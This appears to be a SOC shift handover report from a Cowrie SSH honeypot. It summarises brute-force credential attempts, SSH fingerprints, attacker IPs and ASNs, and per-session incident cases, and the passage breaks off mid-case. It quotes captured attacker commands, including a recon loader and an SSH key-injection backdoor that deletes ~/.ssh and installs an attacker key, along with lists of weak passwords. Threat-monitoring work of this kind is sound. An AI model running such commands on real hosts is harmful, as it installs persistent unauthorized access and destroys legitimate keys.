# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-24 |
| **Generated At** | 2026-07-24T21:08:36Z |
| **Shift Time** | 21:08 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **280** |
| Confirmed Threats | **259** |
| False Positives Filtered | **21** (7.5%) |
| Unique Attacker IPs | **92** |
| Countries of Origin | **34** |
| High Severity Cases | **220** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **60** |
| Malware Samples Analyzed | **3** HIGH · **32** MED · 12 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **241** |
| Unique Credential Pairs | **189** |
| Unique Usernames | **29** |
| Unique Passwords | **69** |
| Successful Auth Pairs | **231** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 22 |
| `admin` | 21 |
| `apache` | 20 |
| `support` | 19 |
| `git` | 18 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `12345678` | 14 |
| `password` | 13 |
| `123456` | 12 |
| `12345` | 11 |
| `123456789` | 10 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `blank` | `blank2010` | 5 |
| `admin` | `admin` | 5 |
| `operator` | `123123123` | 5 |
| `config` | `55` | 4 |
| `support` | `support` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `admin` | `123456` | `92.118.39.71` | 2026-07-24T18:55:40 |
| `nginx` | `proxy` | `193.32.162.42` | 2026-07-24T18:56:16 |
| `admin` | `1234567` | `92.118.39.71` | 2026-07-24T18:57:09 |
| `blank` | `blank2010` | `93.241.232.14` | 2026-07-24T18:57:20 |
| `nginx` | `http` | `193.32.162.42` | 2026-07-24T18:57:25 |
| `nginx` | `config` | `193.32.162.42` | 2026-07-24T18:58:33 |
| `admin` | `12345678` | `92.118.39.71` | 2026-07-24T18:58:37 |
| `apache` | `apache` | `193.32.162.42` | 2026-07-24T18:59:41 |
| `admin` | `123456789` | `92.118.39.71` | 2026-07-24T19:00:10 |
| `blank` | `blank2010` | `60.249.252.94` | 2026-07-24T19:00:36 |
| `blank` | `blank2010` | `136.185.6.181` | 2026-07-24T19:00:44 |
| `blank` | `blank2010` | `10.0.0.73` | 2026-07-24T19:00:49 |
| `apache` | `password` | `193.32.162.42` | 2026-07-24T19:00:50 |
| `admin` | `1q2w3e4r` | `92.118.39.71` | 2026-07-24T19:01:44 |
| `apache` | `123456` | `193.32.162.42` | 2026-07-24T19:02:00 |
| `apache` | `12345` | `193.32.162.42` | 2026-07-24T19:03:12 |
| `admin` | `654321` | `92.118.39.71` | 2026-07-24T19:03:19 |
| `apache` | `123456789` | `193.32.162.42` | 2026-07-24T19:04:21 |
| `admin` | `Admin123` | `92.118.39.71` | 2026-07-24T19:04:58 |
| `apache` | `passw0rd` | `193.32.162.42` | 2026-07-24T19:05:32 |
| `admin` | `P@ssw0rd` | `92.118.39.71` | 2026-07-24T19:06:36 |
| `apache` | `12345678` | `193.32.162.42` | 2026-07-24T19:06:41 |
| `config` | `55` | `49.124.153.28` | 2026-07-24T19:07:28 |
| `config` | `55` | `96.1.40.151` | 2026-07-24T19:07:40 |
| `config` | `55` | `10.0.0.73` | 2026-07-24T19:07:48 |
| `apache` | `1234` | `193.32.162.42` | 2026-07-24T19:07:51 |
| `admin` | `admin` | `92.118.39.71` | 2026-07-24T19:08:11 |
| `apache` | `qwerty` | `193.32.162.42` | 2026-07-24T19:08:59 |
| `admin` | `passw0rd` | `92.118.39.71` | 2026-07-24T19:09:47 |
| `apache` | `letmein` | `193.32.162.42` | 2026-07-24T19:10:08 |
| `apache` | `123123` | `193.32.162.42` | 2026-07-24T19:11:18 |
| `admin` | `password` | `92.118.39.71` | 2026-07-24T19:11:22 |
| `apache` | `123` | `193.32.162.42` | 2026-07-24T19:12:29 |
| `admin` | `password1` | `92.118.39.71` | 2026-07-24T19:12:58 |
| `apache` | `admin` | `193.32.162.42` | 2026-07-24T19:13:40 |
| `admin` | `qwerty` | `92.118.39.71` | 2026-07-24T19:14:41 |
| `apache` | `server` | `193.32.162.42` | 2026-07-24T19:14:48 |
| `apache` | `httpd` | `193.32.162.42` | 2026-07-24T19:15:56 |
| `admin1` | `123123` | `92.118.39.71` | 2026-07-24T19:16:24 |
| `apache` | `tomcat` | `193.32.162.42` | 2026-07-24T19:17:05 |
| `admin1` | `12345` | `92.118.39.71` | 2026-07-24T19:18:11 |
| `apache` | `localhost` | `193.32.162.42` | 2026-07-24T19:18:16 |
| `debian` | `33333` | `200.222.71.218` | 2026-07-24T19:18:31 |
| `root` | `99999` | `182.139.39.150` | 2026-07-24T19:18:42 |
| `debian` | `33333` | `10.0.0.73` | 2026-07-24T19:18:58 |
| `apache` | `www` | `193.32.162.42` | 2026-07-24T19:19:26 |
| `admin1` | `123456` | `92.118.39.71` | 2026-07-24T19:19:55 |
| `git` | `git` | `193.32.162.42` | 2026-07-24T19:20:36 |
| `admin1` | `password` | `92.118.39.71` | 2026-07-24T19:21:35 |
| `git` | `password` | `193.32.162.42` | 2026-07-24T19:21:47 |
| `sales` | `1234` | `123.160.165.208` | 2026-07-24T19:21:55 |
| `345gs5662d34` | `345gs5662d34` | `123.160.165.208` | 2026-07-24T19:21:59 |
| `sales` | `3245gs5662d34` | `123.160.165.208` | 2026-07-24T19:22:01 |
| `git` | `123456` | `193.32.162.42` | 2026-07-24T19:22:57 |
| `administrator` | `123123` | `92.118.39.71` | 2026-07-24T19:23:20 |
| `default` | `default2007` | `182.75.197.174` | 2026-07-24T19:23:57 |
| `git` | `12345` | `193.32.162.42` | 2026-07-24T19:24:05 |
| `default` | `default2007` | `10.0.0.73` | 2026-07-24T19:24:19 |
| `administrator` | `12345` | `92.118.39.71` | 2026-07-24T19:25:09 |
| `git` | `123456789` | `193.32.162.42` | 2026-07-24T19:25:13 |
| `git` | `passw0rd` | `193.32.162.42` | 2026-07-24T19:26:21 |
| `administrator` | `123456` | `92.118.39.71` | 2026-07-24T19:26:56 |
| `root` | `admin` | `91.92.47.37` | 2026-07-24T19:27:09 |
| `git` | `12345678` | `193.32.162.42` | 2026-07-24T19:27:27 |
| `git` | `1234` | `193.32.162.42` | 2026-07-24T19:28:39 |
| `administrator` | `1234567` | `92.118.39.71` | 2026-07-24T19:28:45 |
| `git` | `qwerty` | `193.32.162.42` | 2026-07-24T19:29:47 |
| `administrator` | `12345678` | `92.118.39.71` | 2026-07-24T19:30:38 |
| `git` | `letmein` | `193.32.162.42` | 2026-07-24T19:30:56 |
| `git` | `123123` | `193.32.162.42` | 2026-07-24T19:32:07 |
| `administrator` | `123456789` | `92.118.39.71` | 2026-07-24T19:32:30 |
| `git` | `123` | `193.32.162.42` | 2026-07-24T19:33:17 |
| `administrator` | `password` | `92.118.39.71` | 2026-07-24T19:34:16 |
| `git` | `github` | `193.32.162.42` | 2026-07-24T19:34:25 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-24T19:34:34 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-24T19:34:34 |
| `git` | `gitlab` | `193.32.162.42` | 2026-07-24T19:35:33 |
| `apache` | `12345678` | `92.118.39.71` | 2026-07-24T19:36:02 |
| `git` | `code` | `193.32.162.42` | 2026-07-24T19:36:41 |
| `support` | `support` | `176.53.159.196` | 2026-07-24T19:37:37 |
| `apache` | `password` | `92.118.39.71` | 2026-07-24T19:37:46 |
| `git` | `commit` | `193.32.162.42` | 2026-07-24T19:37:50 |
| `root` | `admin` | `130.12.180.174` | 2026-07-24T19:38:28 |
| `support` | `support` | `10.0.0.73` | 2026-07-24T19:38:57 |
| `git` | `push` | `193.32.162.42` | 2026-07-24T19:38:57 |
| `backup` | `123` | `92.118.39.71` | 2026-07-24T19:39:25 |
| `git` | `deploy` | `193.32.162.42` | 2026-07-24T19:40:06 |
| `backup` | `12345678` | `92.118.39.71` | 2026-07-24T19:41:03 |
| `docker` | `docker` | `193.32.162.42` | 2026-07-24T19:41:14 |
| `docker` | `password` | `193.32.162.42` | 2026-07-24T19:42:21 |
| `backup` | `backup` | `92.118.39.71` | 2026-07-24T19:42:48 |
| `nobody` | `9999` | `111.171.125.94` | 2026-07-24T19:43:05 |
| `operator` | `operator2022` | `10.0.0.73` | 2026-07-24T19:43:14 |
| `docker` | `123456` | `193.32.162.42` | 2026-07-24T19:43:30 |
| `admin` | `admin` | `47.253.5.130` | 2026-07-24T19:44:25 |
| `admin` | `admin` | `130.12.180.51` | 2026-07-24T19:44:25 |
| `backup` | `backup123` | `92.118.39.71` | 2026-07-24T19:44:34 |
| `docker` | `12345` | `193.32.162.42` | 2026-07-24T19:44:38 |
| `docker` | `123456789` | `193.32.162.42` | 2026-07-24T19:45:46 |
| `admin` | `admin` | `43.110.38.5` | 2026-07-24T19:45:54 |
| `backup` | `password` | `92.118.39.71` | 2026-07-24T19:46:18 |
| `docker` | `passw0rd` | `193.32.162.42` | 2026-07-24T19:46:54 |
| `root` | `root2021` | `209.173.10.75` | 2026-07-24T19:47:09 |
| `root` | `root2021` | `87.117.32.22` | 2026-07-24T19:47:15 |
| `root` | `root2021` | `10.0.0.73` | 2026-07-24T19:47:45 |
| `docker` | `12345678` | `193.32.162.42` | 2026-07-24T19:48:02 |
| `centos` | `12345678` | `92.118.39.71` | 2026-07-24T19:48:03 |
| `docker` | `1234` | `193.32.162.42` | 2026-07-24T19:49:11 |
| `centos` | `654321` | `92.118.39.71` | 2026-07-24T19:49:42 |
| `docker` | `qwerty` | `193.32.162.42` | 2026-07-24T19:50:20 |
| `centos` | `centos` | `92.118.39.71` | 2026-07-24T19:51:21 |
| `docker` | `letmein` | `193.32.162.42` | 2026-07-24T19:51:28 |
| `docker` | `123123` | `193.32.162.42` | 2026-07-24T19:52:38 |
| `config` | `55555` | `207.254.71.129` | 2026-07-24T19:52:49 |
| `centos` | `centos123` | `92.118.39.71` | 2026-07-24T19:52:59 |
| `config` | `55555` | `41.65.118.172` | 2026-07-24T19:53:01 |
| `docker` | `123` | `193.32.162.42` | 2026-07-24T19:53:45 |
| `debian` | `111111` | `92.118.39.71` | 2026-07-24T19:54:39 |
| `docker` | `admin` | `193.32.162.42` | 2026-07-24T19:54:53 |
| `guest` | `1` | `193.32.162.42` | 2026-07-24T19:56:01 |
| `debian` | `123123` | `92.118.39.71` | 2026-07-24T19:56:15 |
| `config` | `55555` | `10.0.0.73` | 2026-07-24T19:56:19 |
| `guest` | `12` | `193.32.162.42` | 2026-07-24T19:57:08 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `35.203.210.215` | 2026-07-24T19:57:34 |
| `debian` | `12345` | `92.118.39.71` | 2026-07-24T19:57:53 |
| `guest` | `123` | `193.32.162.42` | 2026-07-24T19:58:13 |
| `guest` | `1234` | `193.32.162.42` | 2026-07-24T19:59:21 |
| `debian` | `123456` | `92.118.39.71` | 2026-07-24T19:59:34 |
| `guest` | `12345` | `193.32.162.42` | 2026-07-24T20:00:29 |
| `debian` | `12345678` | `92.118.39.71` | 2026-07-24T20:01:17 |
| `guest` | `123456` | `193.32.162.42` | 2026-07-24T20:01:37 |
| `guest` | `1234567` | `193.32.162.42` | 2026-07-24T20:02:46 |
| `debian` | `123456789` | `92.118.39.71` | 2026-07-24T20:03:02 |
| `mysql` | `159753` | `84.5.129.68` | 2026-07-24T20:03:46 |
| `Support` | `qwerty123` | `207.219.221.101` | 2026-07-24T20:03:46 |
| `guest` | `12345678` | `193.32.162.42` | 2026-07-24T20:03:54 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-24T20:04:22 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-24T20:04:22 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-24T20:04:29 |
| `debian` | `password` | `92.118.39.71` | 2026-07-24T20:04:45 |
| `guest` | `123456789` | `193.32.162.42` | 2026-07-24T20:05:04 |
| `guest` | `1234567890` | `193.32.162.42` | 2026-07-24T20:06:12 |
| `debian` | `qwerty` | `92.118.39.71` | 2026-07-24T20:06:22 |
| `Support` | `qwerty123` | `60.251.229.144` | 2026-07-24T20:07:12 |
| `unknown` | `letmein` | `78.197.6.173` | 2026-07-24T20:07:13 |
| `Support` | `qwerty123` | `180.76.104.208` | 2026-07-24T20:07:20 |
| `guest` | `password` | `193.32.162.42` | 2026-07-24T20:07:21 |
| `Support` | `qwerty123` | `10.0.0.73` | 2026-07-24T20:07:36 |
| `mysql` | `159753` | `10.0.0.73` | 2026-07-24T20:07:40 |
| `deploy` | `111111` | `92.118.39.71` | 2026-07-24T20:08:00 |
| `guest` | `qwerty` | `193.32.162.42` | 2026-07-24T20:08:31 |
| `guest` | `letmein` | `193.32.162.42` | 2026-07-24T20:09:38 |
| `deploy` | `123123` | `92.118.39.71` | 2026-07-24T20:09:42 |
| `unknown` | `letmein` | `59.120.8.61` | 2026-07-24T20:10:25 |
| `unknown` | `letmein` | `10.0.0.73` | 2026-07-24T20:10:37 |
| `guest` | `abc123` | `193.32.162.42` | 2026-07-24T20:10:45 |
| `deploy` | `12345` | `92.118.39.71` | 2026-07-24T20:11:20 |
| `guest` | `changeme` | `193.32.162.42` | 2026-07-24T20:11:52 |
| `deploy` | `123456` | `92.118.39.71` | 2026-07-24T20:12:57 |
| `ftp` | `1` | `193.32.162.42` | 2026-07-24T20:13:00 |
| `ftp` | `12` | `193.32.162.42` | 2026-07-24T20:14:07 |
| `deploy` | `1234567` | `92.118.39.71` | 2026-07-24T20:14:38 |
| `ftp` | `123` | `193.32.162.42` | 2026-07-24T20:15:11 |
| `ftp` | `1234` | `193.32.162.42` | 2026-07-24T20:16:12 |
| `deploy` | `12345678` | `92.118.39.71` | 2026-07-24T20:16:20 |
| `root` | `33333` | `196.189.124.229` | 2026-07-24T20:16:56 |
| `root` | `33333` | `102.38.3.107` | 2026-07-24T20:17:11 |
| `ftp` | `12345` | `193.32.162.42` | 2026-07-24T20:17:13 |
| `deploy` | `123456789` | `92.118.39.71` | 2026-07-24T20:17:59 |
| `ftp` | `123456` | `193.32.162.42` | 2026-07-24T20:18:14 |
| `ftp` | `1234567` | `193.32.162.42` | 2026-07-24T20:19:16 |
| `deploy` | `password` | `92.118.39.71` | 2026-07-24T20:19:36 |
| `ftp` | `12345678` | `193.32.162.42` | 2026-07-24T20:20:18 |
| `ftp` | `123456789` | `193.32.162.42` | 2026-07-24T20:21:21 |
| `ftp` | `1234567890` | `193.32.162.42` | 2026-07-24T20:22:25 |
| `ftp` | `password` | `193.32.162.42` | 2026-07-24T20:23:28 |
| `ftp` | `qwerty` | `193.32.162.42` | 2026-07-24T20:24:31 |
| `ftp` | `letmein` | `193.32.162.42` | 2026-07-24T20:25:33 |
| `ftp` | `abc123` | `193.32.162.42` | 2026-07-24T20:26:37 |
| `ftp` | `changeme` | `193.32.162.42` | 2026-07-24T20:27:42 |
| `ubuntu` | `654321` | `178.178.222.52` | 2026-07-24T20:28:12 |
| `blank` | `33333` | `69.126.144.30` | 2026-07-24T20:28:13 |
| `ubuntu` | `654321` | `222.222.124.164` | 2026-07-24T20:28:20 |
| `blank` | `33333` | `61.12.86.90` | 2026-07-24T20:28:21 |
| `support` | `1` | `193.32.162.42` | 2026-07-24T20:28:50 |
| `support` | `12` | `193.32.162.42` | 2026-07-24T20:29:59 |
| `operator` | `123123123` | `107.135.117.245` | 2026-07-24T20:30:20 |
| `support` | `123` | `193.32.162.42` | 2026-07-24T20:31:10 |
| `blank` | `33333` | `116.114.84.246` | 2026-07-24T20:31:44 |
| `blank` | `33333` | `10.0.0.73` | 2026-07-24T20:32:06 |
| `support` | `1234` | `193.32.162.42` | 2026-07-24T20:32:19 |
| `operator` | `123123123` | `124.88.174.143` | 2026-07-24T20:33:17 |
| `operator` | `123123123` | `88.255.189.44` | 2026-07-24T20:33:25 |
| `support` | `12345` | `193.32.162.42` | 2026-07-24T20:33:30 |
| `operator` | `123123123` | `10.0.0.73` | 2026-07-24T20:33:36 |
| `support` | `123456` | `193.32.162.42` | 2026-07-24T20:34:41 |
| `support` | `1234567` | `193.32.162.42` | 2026-07-24T20:35:51 |
| `root` | `Password@321` | `182.93.7.194` | 2026-07-24T20:36:43 |
| `345gs5662d34` | `345gs5662d34` | `182.93.7.194` | 2026-07-24T20:36:47 |
| `root` | `3245gs5662d34` | `182.93.7.194` | 2026-07-24T20:36:48 |
| `support` | `12345678` | `193.32.162.42` | 2026-07-24T20:37:00 |
| `support` | `123456789` | `193.32.162.42` | 2026-07-24T20:38:12 |
| `support` | `1234567890` | `193.32.162.42` | 2026-07-24T20:39:22 |
| `support` | `password` | `193.32.162.42` | 2026-07-24T20:40:32 |
| `root` | `111111` | `2.57.122.209` | 2026-07-24T20:41:07 |
| `admin` | `4444` | `59.92.51.186` | 2026-07-24T20:41:30 |
| `admin` | `4444` | `121.189.198.60` | 2026-07-24T20:41:38 |
| `support` | `qwerty` | `193.32.162.42` | 2026-07-24T20:41:41 |
| `support` | `letmein` | `193.32.162.42` | 2026-07-24T20:42:50 |
| `support` | `abc123` | `193.32.162.42` | 2026-07-24T20:44:01 |
| `support` | `changeme` | `193.32.162.42` | 2026-07-24T20:45:11 |
| `admin` | `4444` | `10.0.0.73` | 2026-07-24T20:45:17 |
| `root` | `123` | `2.57.122.209` | 2026-07-24T20:45:23 |
| `sysadmin` | `1` | `193.32.162.42` | 2026-07-24T20:46:22 |
| `sysadmin` | `12` | `193.32.162.42` | 2026-07-24T20:47:34 |
| `sysadmin` | `123` | `193.32.162.42` | 2026-07-24T20:48:48 |
| `root` | `123123` | `2.57.122.209` | 2026-07-24T20:49:54 |
| `sysadmin` | `1234` | `193.32.162.42` | 2026-07-24T20:49:59 |
| `sysadmin` | `12345` | `193.32.162.42` | 2026-07-24T20:51:13 |
| `sysadmin` | `123456` | `193.32.162.42` | 2026-07-24T20:52:26 |
| `mysql` | `passw0rd` | `200.222.71.218` | 2026-07-24T20:52:27 |
| `mysql` | `passw0rd` | `170.233.29.157` | 2026-07-24T20:52:36 |
| `pi` | `pass` | `59.93.36.136` | 2026-07-24T20:52:40 |
| `pi` | `pass` | `111.198.53.188` | 2026-07-24T20:52:49 |
| `nobody` | `nobody2019` | `110.39.181.194` | 2026-07-24T20:53:09 |
| `nobody` | `nobody2019` | `113.160.140.138` | 2026-07-24T20:53:20 |
| `root` | `123321` | `2.57.122.209` | 2026-07-24T20:53:30 |
| `sysadmin` | `1234567` | `193.32.162.42` | 2026-07-24T20:53:41 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-24T20:53:53 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-24T20:53:53 |
| `sysadmin` | `12345678` | `193.32.162.42` | 2026-07-24T20:54:54 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **280** |
| Sessions with Fingerprint | **14** |
| Unique HASSH Fingerprints | **14** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 168 |
| OpenSSH | 40 |
| libssh | 12 |
| Paramiko (Python) | 8 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 160 | 3 |
| `acaa53e0a7d7...` | Mirai/variant | 39 | 38 |
| `a2de0f306611...` | Mirai/variant | 8 | 3 |
| `af8223ac9914...` | libssh-based | 3 | 1 |
| `03a80b21afa8...` | Modern SSH client | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 160 | 3 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 39 | 38 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 8 | 3 | Mirai/variant |
| `95420f9d932d...` | libssh | 4 | 1 | — |
| `af8223ac9914...` | libssh | 3 | 1 | libssh-based |
| `03a80b21afa8...` | libssh | 3 | 1 | Modern SSH client |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `19532158b559...` | libssh | 2 | 2 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **5** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 160 | 3 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `2.57.122.209`, `193.32.162.42`, `92.118.39.71`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `123.160.165.208`, `182.93.7.194`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **92** |
| Unique ASNs | **59** |
| High-Risk ASNs | **48** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS398324` | Censys, Inc. | 5 | HIGH |
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |
| `AS22773` | Cox Communications Inc. | 4 | MEDIUM |
| `AS46562` | Performive LLC | 4 | LOW |
| `AS9829` | National Internet Backbone | 4 | HIGH |
| `AS48721` | Flyservers S.A. | 3 | HIGH |
| `AS47890` | UNMANAGED LTD | 3 | HIGH |
| `AS31898` | Oracle Corporation | 3 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (219)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-14f6053574b9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 18:55 |
| **Last Seen** | 2026-07-24 18:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:55:38` | `cowrie.session.connect` |
| `2026-07-24 18:55:38` | `cowrie.client.version` |
| `2026-07-24 18:55:39` | `cowrie.client.kex` |
| `2026-07-24 18:55:40` | `cowrie.login.success` |
| `2026-07-24 18:55:41` | `cowrie.session.params` |
| `2026-07-24 18:55:41` | `cowrie.command.input` |
| `2026-07-24 18:55:41` | `cowrie.command.input` |
| `2026-07-24 18:55:41` | `cowrie.command.input` |
| `2026-07-24 18:55:41` | `cowrie.command.input` |
| `2026-07-24 18:55:42` | `cowrie.command.input` |
| `2026-07-24 18:55:42` | `cowrie.command.success` |
| `2026-07-24 18:55:42` | `cowrie.command.input` |
| `2026-07-24 18:55:42` | `cowrie.command.input` |
| `2026-07-24 18:55:42` | `cowrie.command.input` |
| `2026-07-24 18:55:42` | `cowrie.command.input` |
| `2026-07-24 18:55:42` | `cowrie.log.closed` |
| `2026-07-24 18:55:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72e18421d450

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 18:56 |
| **Last Seen** | 2026-07-24 18:56 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:56:10` | `cowrie.session.connect` |
| `2026-07-24 18:56:11` | `cowrie.client.version` |
| `2026-07-24 18:56:11` | `cowrie.client.kex` |
| `2026-07-24 18:56:16` | `cowrie.login.success` |
| `2026-07-24 18:56:19` | `cowrie.session.params` |
| `2026-07-24 18:56:19` | `cowrie.command.input` |
| `2026-07-24 18:56:19` | `cowrie.command.input` |
| `2026-07-24 18:56:19` | `cowrie.command.input` |
| `2026-07-24 18:56:19` | `cowrie.command.input` |
| `2026-07-24 18:56:19` | `cowrie.command.input` |
| `2026-07-24 18:56:19` | `cowrie.command.success` |
| `2026-07-24 18:56:19` | `cowrie.command.input` |
| `2026-07-24 18:56:19` | `cowrie.command.input` |
| `2026-07-24 18:56:19` | `cowrie.command.input` |
| `2026-07-24 18:56:19` | `cowrie.command.input` |
| `2026-07-24 18:56:20` | `cowrie.log.closed` |
| `2026-07-24 18:56:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3238e769e5aa

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 18:57 |
| **Last Seen** | 2026-07-24 18:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
